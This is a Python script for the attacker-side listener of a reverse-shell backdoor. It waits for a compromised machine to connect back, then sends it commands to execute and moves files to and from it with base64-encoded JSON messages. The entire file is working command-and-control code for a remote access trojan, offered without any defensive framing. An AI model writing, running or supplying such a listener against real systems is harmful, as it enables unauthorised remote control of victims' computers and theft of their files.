import socket
import base64
import simplejson
import optparse

class SocketListener:
    def __init__(self,ip,port):
        backdoor_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backdoor_conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        backdoor_conn.bind((ip, port))
        backdoor_conn.listen(0)
        print("Listening...")
        (self.bc_connection, my_address) = backdoor_conn.accept()
        print("Connection OK from " + str(my_address))

    def json_send(self,data):
        json_package = simplejson.dumps(data)
        self.bc_connection.send(json_package.encode("utf-8"))

    def json_receive(self):
        json_package_turn = ""
        while True:
            try:
                json_package_turn = json_package_turn + self.bc_connection.recv(1024).decode()
                return simplejson.loads(json_package_turn)
            except ValueError:
                continue

    def command_execution(self, command_input):
        self.json_send(command_input)

        if command_input[0] == "quit":
            self.bc_connection.close()
            exit()

        return self.json_receive()

    def save_file(self,path,content):
        with open(path,"wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Download OK"

    def get_file_content(self,path):
        with open(path,"rb") as my_file:
            return base64.b64encode(my_file.read())

    def start_listener(self):
        while True:
            command_input = input("Enter command: ")
            command_input = command_input.split(" ")
            try:
                if command_input[0] == "upload":
                    my_file_content = self.get_file_content(command_input[1])
                    command_input.append(my_file_content)

                command_output = self.command_execution(command_input)

                if command_input[0] == "download" and "Error!" not in command_output:
                    command_output = self.save_file(command_input[1],command_output)
            except Exception:
                command_output = "Error"
            print(command_output)

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-i","--ip",dest="ip",help="-i to use for input ip address")
    parse_object.add_option("-p","--port",dest="port",help="-m to use for input port")
    return parse_object.parse_args()

(user_input,args) = get_user_input()
ip = user_input.ip
port = int(user_input.port)
my_socket_listener = SocketListener(ip,port)
my_socket_listener.start_listener()